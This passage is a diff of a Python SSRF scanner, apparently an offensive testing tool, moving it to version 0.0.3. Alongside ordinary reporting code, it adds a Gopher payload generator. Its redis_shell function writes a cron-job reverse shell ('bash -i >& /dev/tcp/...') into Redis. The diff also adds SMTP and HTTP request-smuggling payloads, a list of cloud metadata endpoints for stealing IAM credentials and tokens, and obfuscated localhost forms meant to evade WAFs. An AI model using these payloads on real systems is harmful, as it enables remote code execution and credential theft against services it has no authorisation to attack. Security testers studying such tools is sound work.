@@ -1,140 +1,177 @@
+# -*- coding: utf-8 -*-
 """
-SSRF-Scanner: A comprehensive and powerful tool for detecting Server-Side
-Request Forgery vulnerabilities.
-"""
-# pylint: disable=too-many-lines,broad-except
+SSRF-Scanner V0.0.3
+The most comprehensive single-file SSRF detection suite.
 
-# Copyright 2025 Ruslan Semchenko
-#
-# Licensed under the Apache License, Version 2.0 (the "License");
-# you may not use this file except in compliance with the License.
-# You may obtain a copy of the License at
-#
-#     http://www.apache.org/licenses/LICENSE-2.0
-#
-# Unless required by applicable law or agreed to in writing, software
-# distributed under the License is distributed on an "AS IS" BASIS,
-# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-# See the License for the specific language governing permissions and
-# limitations under the License.
+Features:
+- Multi-Threaded Scanning Engine
+- Circuit Breaker (Anti-Ban System)
+- Recursive Crawler (Same-Domain)
+- Gopher Payload Generator (Redis, MySQL, SMTP, FastCGI)
+- Advanced WAF Evasion (Unicode, Encodings, Obfuscation)
+- Cloud Metadata Extraction (AWS, GCP, Azure, Oracle, Alibaba, DO, OpenStack)
+- HTML/JSON/CSV/TXT Reporting
+- Raw cURL Parsing
+- Heuristic Technology Detection
+"""
+
+# pylint: disable=too-many-lines,broad-except,too-many-instance-attributes
+# pylint: disable=too-many-arguments,too-many-branches,too-many-statements
 
 import argparse
 import base64
 import csv
+import html
 import json
 import logging
 import os
 import queue
 import random
+import re
+import shlex
 import socket
 import sys
 import threading
 import time
+import difflib
+from abc import ABC, abstractmethod
 from collections import deque
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 from datetime import datetime
 from pathlib import Path
 from threading import Thread, Lock
-from typing import Any, Dict, List, Optional
-from urllib.parse import quote
+from typing import Any, Dict, List, Optional, Set, Tuple, Union
+from urllib.parse import quote, unquote, urljoin, urlparse, parse_qs
 
-import colorama
-import requests
-import urllib3
-from colorama import Fore
-from requests.adapters import HTTPAdapter, Retry
-from requests.exceptions import (ConnectionError as RequestsConnectionError,
-                                 RequestException, Timeout)
+# Third-party imports
+try:
+    import colorama
+    import requests
+    import urllib3
+    from colorama import Fore, Style, Back
+    from requests.adapters import HTTPAdapter, Retry
+    from requests.exceptions import (ConnectionError as RequestsConnectionError,
+                                     RequestException, Timeout, TooManyRedirects)
+except ImportError as e:
+    print(f"Missing dependency: {e}")
+    print("Please install: pip install requests colorama")
+    sys.exit(1)
 
+# Init
 colorama.init(autoreset=True)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-__version__ = 'version 0.0.2'
+__version__ = 'version 0.0.3'
 
-def safe_header_value(value):
-    """Filters values that cannot be encoded in latin-1 for HTTP headers."""
+# --- CONSTANTS & CONFIGURATION ---
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
+]
+
+WAF_SIGNATURES = {
+    'Cloudflare': ['cf-ray', '__cfduid', 'cf-cache-status'],
+    'AWS WAF': ['x-amzn-requestid', 'x-amz-id-2'],
+    'Akamai': ['x-akamai-transformed', 'akamai-origin-hop'],
+    'F5 BigIP': ['x-cnection', 'bigipserver'],
+    'Imperva': ['x-cdn', 'incap-ses']
+}
+
+CLOUD_METADATA_URLS = {
+    'AWS': [
+        'http://169.254.169.254/latest/meta-data/',
+        'http://169.254.169.254/latest/user-data',
+        'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+    ],
+    'GCP': [
+        'http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token',
+        'http://169.254.169.254/computeMetadata/v1/',
+        'http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true'
+    ],
+    'Azure': [
+        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
+        'http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-08-01&format=text'
+    ],
+    'Oracle': [
+        'http://169.254.169.254/opc/v1/instance/',
+        'http://169.254.169.254/opc/v2/instance/'
+    ],
+    'Alibaba': [
+        'http://100.100.100.200/latest/meta-data/',
+        'http://100.100.100.200/latest/user-data'
+    ],
+    'DigitalOcean': [
+        'http://169.254.169.254/metadata/v1/'
+    ],
+    'OpenStack': [
+        'http://169.254.169.254/openstack/latest/meta_data.json'
+    ],
+    'Kubernetes': [
+        'https://kubernetes.default.svc.cluster.local'
+    ]
+}
+
+# --- HELPER FUNCTIONS ---
+
+def safe_header_value(value: Any) -> Optional[str]:
+    """Ensures header values are latin-1 compatible (HTTP standard)."""
     try:
+        if isinstance(value, bytes):
+            value = value.decode('utf-8', errors='ignore')
+        value = str(value)
         value.encode('latin-1')
-        return value
-    except UnicodeEncodeError:
+        return value.replace('\n', '').replace('\r', '')
+    except (UnicodeEncodeError, Exception):
         return None
 
+def banner():
+    print(Fore.CYAN + Style.BRIGHT + r"""
+  ███████╗███████╗██████╗ ███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
+  ██╔════╝██╔════╝██╔══██╗██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
+  ███████╗███████╗██████╔╝█████╗      ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
+  ╚════██║╚════██║██╔══██╗██╔══╝      ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
+  ███████║███████║██║  ██║██║         ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
+  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝         ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
+    """ + Style.RESET_ALL)
+    print(Fore.YELLOW + f"  {__version__} by RuslanSemchenko")
+    print(Fore.YELLOW + "  [WRN] Use with caution. You are responsible for your actions.")
+    print(Fore.YELLOW + "  [WRN] Developers assume no liability for misuse.\n")
+
+# --- CORE CLASSES ---
 
 class Config:
-    """Holds the configuration for the scanner."""
+    """Central configuration storage."""
     def __init__(self):
-        self.scanner = {
-            'threads': 10,
-            'timeout': 3,
-            'retry_count': 2,
+        self.options = {
+            'threads': 15,
+            'timeout': 6,
+            'retry_count': 1,
             'debug': False,
             'verify_ssl': False,
             'follow_redirects': True,
             'max_redirects': 3,
-            'output_dir': "output",
-            'user_agent': "SSRF-Scanner/1.0",
+            'output_dir': "ssrf_reports",
+            'user_agent': "SSRF-Scanner/0.0.4",
             'max_pool_size': 100,
-            'capture_cookies': True
-        }
-        self.rate_limiting = {
-            'requests_per_second': 10,
-            'burst_size': 20,
-            'min_rate': 0.5,
-            'max_rate': 50
+            'capture_cookies': True,
+            'crawl_depth': 2,
+            'generate_gopher': True
         }
 
     def get(self, key, default=None):
-        """Gets a configuration value."""
-        return self.scanner.get(key, default)
+        return self.options.get(key, default)
 
+    def set(self, key, value):
+        self.options[key] = value
 
-class ScanProgress:
-    """Tracks the progress of the scan."""
-    def __init__(self):
-        self.phases = {
-            'Local IP': 0,
-            'Cloud Metadata': 0,
-            'Protocol': 0,
-            'Encoded': 0,
-            'Parameter': 0,
-            'Port Scan': 0,
-            'DNS Rebinding': 0,
-            'Remote': 0,
-            'WAF Bypass': 0,
-            'CRLF Injection': 0,
-            'XXE': 0
-        }
-        self.current_phase = None
-        self.total_phases = len(self.phases)
-        self.phase_weight = {
-            'Local IP': 0.25,
-            'Cloud Metadata': 0.15,
-            'Protocol': 0.15,
-            'Encoded': 0.10,
-            'Parameter': 0.10,
-            'Port Scan': 0.10,
-            'DNS Rebinding': 0.10,
-            'Remote': 0.05,
-            'WAF Bypass': 0.05,
-            'CRLF Injection': 0.05,
-            'XXE': 0.05
-        }
-
-    def update_phase(self, phase, progress):
-        """Update the progress of a specific scan phase."""
-        self.phases[phase] = progress
-        self.current_phase = phase
-
-    def get_total_progress(self):
-        """Calculate the weighted total progress of the scan."""
-        total = 0
-        for phase, weight in self.phase_weight.items():
-            total += self.phases[phase] * weight
-        return total * 100
-
-
-# pylint: disable=too-many-instance-attributes
 @dataclass
 class ScanResult:
+    """Data object for a single scan result."""
     url: str
     attack_type: str
     payload: str
@@ -145,1166 +182,612 @@ class ScanResult:
     is_vulnerable: bool
     verification_method: str = ""
     notes: str = ""
+    severity: str = "Medium"
 
+# --- GOPHER PAYLOAD GENERATOR ---
 
-class PayloadGenerator:
-    """Generates various payload variations for SSRF testing."""
+class GopherGenerator:
+    """Advanced engine to construct Gopher payloads."""
+    
+    @staticmethod
+    def _encode_gopher(payload: str) -> str:
+        return quote(quote(payload))
+
+    def redis_shell(self, host: str, port: int, reverse_ip: str, reverse_port: int) -> str:
+        cmd = f"\n\n*/1 * * * * bash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1\n\n"
+        commands = [
+            "flushall",
+            f"set 1 {cmd.replace(' ', '${IFS}')}", 
+            "config set dir /var/spool/cron/",
+            "config set dbfilename root",
+            "save",
+            "quit"
+        ]
+        stream = ""
+        for command in commands:
+            parts = command.split(' ')
+            stream += f"*{len(parts)}\r\n"
+            for part in parts:
+                stream += f"${len(part)}\r\n{part}\r\n"
+        return f"gopher://{host}:{port}/_{quote(stream)}"
+
+    def redis_basic(self, host: str = "127.0.0.1", port: int = 6379) -> str:
+        stream = "*1\r\n$4\r\nINFO\r\n"
+        return f"gopher://{host}:{port}/_{quote(stream)}"
+
+    def smtp_mail(self, host: str, port: int, to_addr: str, subject: str) -> str:
+        commands = [
+            f"MAIL FROM:<ssrf@{host}>",
+            f"RCPT TO:<{to_addr}>",
+            "DATA",
+            f"Subject: {subject}",
+            "",
+            "SSRF Test",
+            ".",
+            "QUIT"
+        ]
+        stream = "\r\n".join(commands) + "\r\n"
+        return f"gopher://{host}:{port}/_{quote(stream)}"
+
+    def http_post(self, host: str, port: int, path: str, body: str) -> str:
+        req = (
+            f"POST {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            "Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Content-Length: {len(body)}\r\n"
+            "\r\n"
+            f"{body}"
+        )
+        return f"gopher://{host}:{port}/_{quote(req)}"
+
+# --- ADVANCED PAYLOAD MUTATOR ---
+
+class PayloadMutator:
+    """Transforms basic IPs into advanced obfuscated formats."""
+    
     def __init__(self):
-        self.ip_formats = ['decimal', 'hex', 'octal']
-        self.url_encodings = ['single', 'double', 'base64']
-        self.protocol_variations = ['standard', 'nested', 'mixed']
+        self.gopher = GopherGenerator()
 
-    def generate_ip_variations(self, ip):
-        """Generates different IP address format variations."""
-        # pylint: disable=too-many-branches,too-many-statements
+    def generate_ip_variations(self, ip: str) -> List[str]:
         variations = set()
-        try:
-            variations.add(ip)
-            if ip in ['localhost', 'internal', 'intranet']:
-                variations.add('127.0.0.1')
-                return list(variations)
-            if ':' in ip:
-                variations.add(ip)
-                variations.add(ip.strip('[]'))
-                variations.add(f'[{ip}]')
-                return list(variations)
-            if any(c.isalpha() for c in ip):
-                variations.add(ip)
-                return list(variations)
-            if '.' in ip:
-                try:
-                    parts = ip.split('.')
-                    if len(parts) == 4:
-                        variations.add(ip)
-                        try:
-                            ipint = int.from_bytes(socket.inet_aton(ip), 'big')
-                            variations.add(str(ipint))
-                        except (TypeError, socket.error):
-                            pass
-                        try:
-                            hex_parts = [hex(int(part))[2:] for part in parts]
-                            variations.add('.'.join(f"0x{part}" for part in hex_parts))
-                        except ValueError:
-                            pass
-                        try:
-                            oct_parts = [oct(int(part))[2:] for part in parts]
-                            variations.add('.'.join(f"0{part}" for part in oct_parts))
-                        except ValueError:
-                            pass
-                        try:
-                            variations.add(
-                                f"{parts[0]}.{int(parts[1])}."
-                                f"{hex(int(parts[2]))[2:]}.{oct(int(parts[3]))[2:]}"
-                            )
-                        except ValueError:
-                            pass
-                except Exception as e:
-                    logging.debug("Error processing IPv4 address %s: %s", ip, e)
-            elif ip.startswith('0x'):
-                try:
-                    dec = int(ip[2:], 16)
-                    ip_bytes = dec.to_bytes(4, 'big')
-                    variations.add('.'.join(str(b) for b in ip_bytes))
-                except (ValueError, TypeError, OverflowError):
-                    variations.add(ip)
-            elif ip.startswith('0'):
-                try:
-                    dec = int(ip, 8)
-                    ip_bytes = dec.to_bytes(4, 'big')
-                    variations.add('.'.join(str(b) for b in ip_bytes))
-                except (ValueError, TypeError, OverflowError):
-                    variations.add(ip)
-            current_variations = variations.copy()
-            for var in current_variations:
-                variations.add(quote(var))
-                variations.add(quote(quote(var)))
-        except Exception as e:
-            logging.debug("Error generating variations for %s: %s", ip, e)
-            variations.add(ip)
-        return list(variations)
+        variations.add(ip)
 
-    def generate_url_encodings(self, url):
-        """Generates various URL encoding variations."""
-        variations = set()
-        try:
-            variations.add(url)
-            variations.add(quote(url))
-            variations.add(quote(quote(url)))
-            variations.add(base64.b64encode(url.encode()).decode())
-            # Исключаем варианты, которые не кодируются в latin-1
-            # Exclude variants that are not encoded in latin-1 and add more
-            for var in [url.replace('.', '%2e'), url.replace('/', '%2f'),
-                        url.replace('.', '。'), url.replace('//', '／／')]:
-                if safe_header_value(var):
-                    variations.add(var)
-        except Exception as e:
-            logging.debug("Error generating URL encodings for %s: %s", url, e)
-            variations.add(url)
-        return list(variations)
+        if ip in ['127.0.0.1', 'localhost']:
+            variations.add('[::ffff:127.0.0.1]')
+            variations.add('[::ffff:7f00:1]')
+            variations.add('127.1')
+            variations.add('0177.0.0.1')
+            variations.add('0x7f.0.0.1')
+            variations.add('2130706433')
+            variations.add('0x7f000001')
+            variations.add('①②⑦.⓪.⓪.①')
+            variations.add('①②⑦.①')
+            variations.add('ⓛⓞⓒⓐⓛⓗⓞⓢⓣ')
+            variations.add('localhost%00')
+            variations.add('127.0.0.1%09')
+            variations.add('localtest.me')
+            variations.add('customer-k8s.local')
+            variations.add('metadata.google.internal')
+            variations.add('169.254.169.254')
+            variations.add('[fd00:ec2::254]') 
 
-    def generate_protocol_variations(self, protocol, payload):
-        """Generates variations for a given protocol and payload."""
-        variations = set()
-        try:
-            variations.add(f"{protocol}://{payload}")
-            variations.add(f"{protocol}:/{payload}")
-            variations.add(f"{protocol}:///{payload}")
-            variations.add(f"{protocol}://{protocol}://{payload}")
-            variations.add(f"{protocol.upper()}://{payload}")
-            variations.add(f"{protocol.title()}://{payload}")
-            variations.add(f"{quote(protocol)}://{payload}")
-        except Exception as e:
-            logging.error("Error generating protocol variations for %s: %s", protocol, e)
-        return list(variations)
+        if ip in ['127.0.0.1', 'localhost']:
+            variations.add(self.gopher.redis_basic())
+        
+        final_list = set()
+        for v in variations:
+            final_list.add(v)
+            final_list.add(quote(v))
+            final_list.add(quote(quote(v)))
+            
+        return list(final_list)
 
-
-class ProtocolHandler:
-    """Handles generation of payloads for specific protocols."""
-    def __init__(self):
-        self.generator = PayloadGenerator()
-
-    def handle_gopher(self, payload):
-        """Generate gopher-specific payloads."""
+    def generate_scheme_variations(self, url_payload: str) -> List[str]:
         variations = []
-        try:
-            variations.append(f"gopher://{payload}")
-            variations.append(f"gopher://{payload}:70")
-            variations.append(f"gopher://{payload}/1")
-            for var in self.generator.generate_url_encodings(f"gopher://{payload}"):
-                if safe_header_value(var):
-                    variations.append(var)
-        except Exception as e:
-            logging.error("Error handling gopher protocol: %s", e)
+        variations.append(f"file://{url_payload}")
+        variations.append(f"dict://{url_payload}")
+        variations.append(f"ldap://{url_payload}")
+        variations.append(f"tftp://{url_payload}")
+        variations.append(f"netdoc://{url_payload}")
+        if '/' not in url_payload:
+            variations.append(f"php://filter/convert.base64-encode/resource={url_payload}")
         return variations
 
-    def handle_dict(self, payload):
-        """Generate dict-specific payloads."""
-        variations = []
-        try:
-            variations.append(f"dict://{payload}")
-            variations.append(f"dict://{payload}/d:password")
-            variations.append(f"dict://{payload}/show:db")
-            variations.append(f"dict://dict:dict@{payload}")
-        except Exception as e:
-            logging.error("Error handling dict protocol: %s", e)
-        return variations
+# --- REPORTING ENGINE ---
 
-    def handle_file(self, payload):
-        """Generate file-specific payloads."""
-        variations = []
-        try:
-            variations.append(f"file://{payload}")
-            variations.append(f"file:///{payload}")
-            variations.append("file:///etc/passwd")
-            variations.append("file:///windows/win.ini")
-            variations.append(f"file://../{payload}")
-            variations.append(f"file:///./{payload}")
-        except Exception as e:
-            logging.error("Error handling file protocol: %s", e)
-        return variations
+class HTMLReporter:
+    """Generates a standalone HTML dashboard."""
+    
+    @staticmethod
+    def generate(results: List[ScanResult], output_file: Path):
+        vulns = [r for r in results if r.is_vulnerable]
+        scan_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        html_template = f"""
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <title>SSRF-Scanner Report</title>
+            <style>
+                body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1e1e24; color: #e2e2e2; margin: 0; }}
+                .container {{ width: 90%; margin: 20px auto; }}
+                .header {{ background: #2a2a35; padding: 20px; border-radius: 8px; border-bottom: 4px solid #00d2d3; }}
+                .stats {{ display: flex; gap: 20px; margin-top: 20px; }}
+                .card {{ background: #2a2a35; padding: 20px; border-radius: 8px; flex: 1; text-align: center; }}
+                .number {{ font-size: 2.5em; font-weight: bold; color: #00d2d3; }}
+                table {{ width: 100%; border-collapse: collapse; margin-top: 30px; background: #2a2a35; border-radius: 8px; overflow: hidden; }}
+                th, td {{ padding: 12px 15px; text-align: left; border-bottom: 1px solid #444; }}
+                th {{ background: #00d2d3; color: white; }}
+                tr:hover {{ background: #3a3a45; }}
+                .vuln {{ color: #ff6b81; font-weight: bold; }}
+                .safe {{ color: #2ed573; }}
+                code {{ background: #111; padding: 4px 8px; border-radius: 4px; font-family: monospace; color: #7bed9f; }}
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="header">
+                    <h1>SSRF-Scanner Report</h1>
+                    <p>Generated: {scan_date} | {__version__}</p>
+                </div>
+                
+                <div class="stats">
+                    <div class="card">
+                        <div class="number">{len(results)}</div>
+                        <div>Total Requests</div>
+                    </div>
+                    <div class="card">
+                        <div class="number">{len(vulns)}</div>
+                        <div>Vulnerabilities Found</div>
+                    </div>
+                    <div class="card">
+                        <div class="number">{len(set(r.url for r in results))}</div>
+                        <div>Unique URLs</div>
+                    </div>
+                </div>
 
-    def generate_protocol_variations(self, protocol, payload):
-        """Generate protocol variations using the payload generator."""
-        return self.generator.generate_protocol_variations(protocol, payload)
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Target URL</th>
+                            <th>Payload</th>
+                            <th>Type</th>
+                            <th>Verification</th>
+                            <th>Status</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+        """
+        
+        rows = ""
+        for idx, res in enumerate(vulns):
+            rows += f"""
+                        <tr>
+                            <td>{idx + 1}</td>
+                            <td>{html.escape(res.url)}</td>
+                            <td><code>{html.escape(res.payload)}</code></td>
+                            <td>{res.attack_type}</td>
+                            <td>{res.verification_method}</td>
+                            <td class="vuln">CRITICAL</td>
+                        </tr>
+            """
+            
+        footer = """
+                    </tbody>
+                </table>
+            </div>
+        </body>
+        </html>
+        """
+        
+        with open(output_file, 'w', encoding='utf-8') as f:
+            f.write(html_template + rows + footer)
 
 
 class Reporter:
-    """Handles reporting of scan results to various formats."""
+    """Manages all reporting formats."""
     def __init__(self, output_dir: str):
         self.output_dir = Path(output_dir)
         self.output_dir.mkdir(parents=True, exist_ok=True)
         self.results: List[ScanResult] = []
-        self.txt_output = self.output_dir / 'report.txt'
-        self.json_output = self.output_dir / 'report.json'
-        self.csv_output = self.output_dir / 'report.csv'
-
-    def add_result(self, result: ScanResult):
-        """Adds a scan result and writes it to output files if vulnerable."""
-        self.results.append(result)
-        if result.is_vulnerable:
-            self._write_result(result)
-
-    def _write_result(self, result: ScanResult):
-        """Writes a single result to all configured output files."""
-        with open(self.txt_output, 'a', encoding='utf-8') as f:
-            f.write("\nPotential SSRF Found!\n")
-            f.write(f"URL: {result.url}\n")
-            f.write(f"Attack Type: {result.attack_type}\n")
-            f.write(f"Payload: {result.payload}\n")
-            f.write(f"Response Code: {result.response_code}\n")
-            f.write(f"Response Size: {result.response_size}\n")
-            f.write(f"Verification Method: {result.verification_method}\n")
-            f.write(f"Notes: {result.notes}\n")
-            f.write("-" * 50 + "\n")
-        with open(self.csv_output, 'a', newline='', encoding='utf-8') as f:
-            writer = csv.writer(f)
-            if f.tell() == 0:
-                writer.writerow([
-                    'URL', 'Attack Type', 'Payload', 'Response Code',
-                    'Response Size', 'Verification Method', 'Timestamp', 'Notes'
-                ])
-            writer.writerow([
-                result.url, result.attack_type, result.payload,
-                result.response_code, result.response_size,
-                result.verification_method, result.timestamp, result.notes
-            ])
-        results_json = []
-        if self.json_output.exists():
-            with open(self.json_output, 'r', encoding='utf-8') as f:
-                try:
-                    results_json = json.load(f)
-                except json.JSONDecodeError:
-                    results_json = []
-        results_json.append({
-            'url': result.url,
-            'attack_type': result.attack_type,
-            'payload': result.payload,
-            'response_code': result.response_code,
-            'response_size': result.response_size,
-            'verification_method': result.verification_method,
-            'timestamp': result.timestamp.isoformat(),
-            'notes': result.notes
-        })
-        with open(self.json_output, 'w', encoding='utf-8') as f:
-            json.dump(results_json, f, indent=2)
-
-    def generate_summary(self, urls_analyzed: int, error_urls: int) -> str:
-        """Generates a final summary report of the scan."""
-        stats = self._calculate_statistics(urls_analyzed, error_urls)
-        summary = "\n" + "="*50 + "\n"
-        summary += "SSRF Scan Summary\n"
-        summary += "="*50 + "\n\n"
-        summary += "Statistics:\n"
-        summary += "-"*20 + "\n"
-        for key, value in stats.items():
-            summary += f"{key:25}: {value}\n"
-        summary += "\nVulnerabilities by Attack Type:\n"
-        summary += "-"*30 + "\n"
-        grouped = self._group_vulnerabilities()
-        for attack_type, results in grouped.items():
-            summary += f"{attack_type}: {len(results)} found\n"
-        summary += "\n" + "="*50 + "\n"
-        summary += "Detailed results saved in:\n"
-        summary += f"  Text Report: {self.txt_output.resolve()}\n"
-        summary += f"  CSV Report:  {self.csv_output.resolve()}\n"
-        summary += f"  JSON Report: {self.json_output.resolve()}\n"
-        with open(self.output_dir / 'summary.txt', 'w', encoding='utf-8') as f:
-            f.write(summary)
-        return summary
-
-    def _calculate_statistics(self, urls_analyzed: int, error_urls: int) -> Dict[str, Any]:
-        """Calculates various statistics about the scan results."""
-        total_vulnerabilities = len([r for r in self.results if r.is_vulnerable])
-        unique_vuln_types = len(set(r.attack_type for r in self.results if r.is_vulnerable))
-        return {
-            'URLs Processed': urls_analyzed,
-            'Total Requests Made': len(self.results),
-            'URL Errors': error_urls,
-            'Vulnerabilities Found': total_vulnerabilities,
-            'Vulnerability Rate':
-                f"{(total_vulnerabilities / len(self.results)) * 100:.2f}%" if self.results else "0%",
-            'Unique Vulnerability Types': unique_vuln_types
+        
+        self.files = {
+            'txt': self.output_dir / 'report.txt',
+            'csv': self.output_dir / 'report.csv',
+            'json': self.output_dir / 'report.json',
+            'html': self.output_dir / 'dashboard.html'
         }
 
-    def _group_vulnerabilities(self) -> Dict[str, List[ScanResult]]:
-        """Groups vulnerabilities by attack type."""
-        grouped = {}
-        for result in self.results:
-            if result.is_vulnerable:
-                if result.attack_type not in grouped:
-                    grouped[result.attack_type] = []
-                grouped[result.attack_type].append(result)
-        return grouped
+    def add_result(self, result: ScanResult):
+        self.results.append(result)
+        if result.is_vulnerable:
+            self.save_txt(result)
+            self.save_csv(result)
+            self.save_json() 
+            
+    def save_txt(self, res: ScanResult):
+        with open(self.files['txt'], 'a', encoding='utf-8') as f:
+            f.write(f"[{res.timestamp}] VULNERABLE: {res.url}\n")
+            f.write(f"  Type: {res.attack_type}\n")
+            f.write(f"  Payload: {res.payload}\n")
+            f.write(f"  Method: {res.verification_method}\n")
+            f.write(f"  Notes: {res.notes}\n\n")
 
+    def save_csv(self, res: ScanResult):
+        exists = self.files['csv'].exists()
+        with open(self.files['csv'], 'a', newline='', encoding='utf-8') as f:
+            w = csv.writer(f)
+            if not exists:
+                w.writerow(['Timestamp', 'URL', 'Type', 'Payload', 'Code', 'Verification'])
+            w.writerow([res.timestamp, res.url, res.attack_type, res.payload, res.response_code, res.verification_method])
 
-class RateLimiter:
-    """A token-bucket rate limiter with adaptive rate adjustment."""
-    def __init__(self, requests_per_second: float, burst_size: int = 10):
-        self.rate = requests_per_second
-        self.burst_size = burst_size
-        self.tokens = burst_size
-        self.last_update = time.time()
-        self.lock = threading.Lock()
-        self.request_history = deque(maxlen=1000)
-        self.error_count = 0
-        self.success_count = 0
-        self.adaptive_rate = requests_per_second
-        self.min_rate = 0.5
-        self.max_rate = requests_per_second * 2
-
-    def wait(self) -> bool:
-        """Blocks until a request can be made, respecting the rate limit."""
-        with self.lock:
-            now = time.time()
-            time_passed = now - self.last_update
-            self.tokens = min(
-                self.burst_size,
-                self.tokens + time_passed * self.rate
-            )
-            if self.tokens >= 1:
-                self.tokens -= 1
-                self.last_update = now
-                self.request_history.append(now)
-                return True
-            wait_time = (1 - self.tokens) / self.rate
-            time.sleep(wait_time)
-            self.tokens -= 1
-            self.last_update = time.time()
-            self.request_history.append(self.last_update)
-            return True
-
-    def adjust_rate(self, success: bool):
-        """Adjusts the request rate based on the success of recent requests."""
-        with self.lock:
-            if success:
-                self.success_count += 1
-                self.error_count = max(0, self.error_count - 1)
-                if self.success_count > 10:
-                    self.adaptive_rate = min(
-                        self.max_rate,
-                        self.adaptive_rate * 1.1
-                    )
-                    self.success_count = 0
-            else:
-                self.error_count += 1
-                self.success_count = 0
-                if self.error_count > 3:
-                    self.adaptive_rate = max(
-                        self.min_rate,
-                        self.adaptive_rate * 0.5
-                    )
-                    self.error_count = 0
-            self.rate = self.adaptive_rate
-
-
-class SmartThrottler:
-    """A throttler that combines rate limiting with exponential backoff."""
-    def __init__(self):
-        self.rate_limiter = RateLimiter(requests_per_second=10)
-        self.backoff_time = 1.0
-        self.max_backoff = 30.0
-        self.success_threshold = 5
-        self.consecutive_successes = 0
-        self.consecutive_failures = 0
-        self.lock = threading.Lock()
-
-    def pre_request(self):
-        """Called before a request is made to wait if necessary."""
-        self.rate_limiter.wait()
-
-    def post_request(self, success: bool):
-        """Called after a request is made to adjust throttling."""
-        with self.lock:
-            if success:
-                self.consecutive_successes += 1
-                self.consecutive_failures = 0
-                self._decrease_backoff()
-            else:
-                self.consecutive_failures += 1
-                self.consecutive_successes = 0
-                self._increase_backoff()
-            self.rate_limiter.adjust_rate(success)
-
-    def _increase_backoff(self):
-        """Increases the backoff time on failure."""
-        self.backoff_time = min(
-            self.max_backoff,
-            self.backoff_time * 2
-        )
-        time.sleep(self.backoff_time)
-
-    def _decrease_backoff(self):
-        """Decreases the backoff time on success."""
-        if self.consecutive_successes >= self.success_threshold:
-            self.backoff_time = max(
-                1.0,
-                self.backoff_time * 0.5
-            )
-
-
-class ErrorHandler:
-    """Handles errors during requests, with logic for retries and WAF detection."""
-    def __init__(self):
-        self.throttler = SmartThrottler()
-        self.max_retries = 3
-        self.timeout_multiplier = 1.5
-        self.current_timeout = 10
-        self.error_counts: Dict[str, int] = {}
-        self.waf_signatures = [
-            'blocked',
-            'forbidden',
-            'waf',
-            'security',
-            'cloudflare',
-            'protection'
+    def save_json(self):
+        data = [
+            {
+                'url': r.url,
+                'type': r.attack_type,
+                'payload': r.payload,
+                'vuln': r.is_vulnerable,
+                'details': r.notes
+            }
+            for r in self.results if r.is_vulnerable
         ]
+        with open(self.files['json'], 'w', encoding='utf-8') as f:
+            json.dump(data, f, indent=2)
 
-    def handle_error(self, url: str, error: Exception, response: Optional[requests.Response] = None) -> bool:
-        error_type = type(error).__name__
-        """Handles a request error, returns True if a retry should be attempted."""
-        self.error_counts[error_type] = self.error_counts.get(error_type, 0) + 1
-        if isinstance(error, Timeout):
-            return self.handle_timeout()
-        if isinstance(error, RequestsConnectionError):
-            return self.handle_connection_error(url)
-        elif isinstance(error, RequestException):
-            if response and self._detect_waf(response):
-                return self.handle_waf(url)
-            return self.handle_general_error(error)
-        return False
+    def finalize(self):
+        HTMLReporter.generate(self.results, self.files['html'])
+        vulns = [r for r in self.results if r.is_vulnerable]
+        print(f"\n{Fore.GREEN}[*] Reports Saved:{Style.RESET_ALL}")
+        print(f"  HTML: {self.files['html']}")
+        print(f"  JSON: {self.files['json']}")
+        print(f"  TXT:  {self.files['txt']}")
+        return len(vulns)
 
-    def handle_timeout(self) -> bool:
-        """Handles a timeout error."""
-        self.current_timeout *= self.timeout_multiplier
-        self.throttler.post_request(success=False)
-        return True
+# --- SCANNER LOGIC ---
 
-    def handle_connection_error(self, url: str) -> bool:
-        """Handles a connection error."""
-        logging.warning("Connection error for %s. Retrying...", url)
-        time.sleep(random.uniform(1, 3))
-        self.throttler.post_request(success=False)
-        return True
-
-    def handle_waf(self, url: str) -> bool:
-        """Handles WAF detection."""
-        logging.warning("WAF detected for %s. Adjusting strategy...", url)
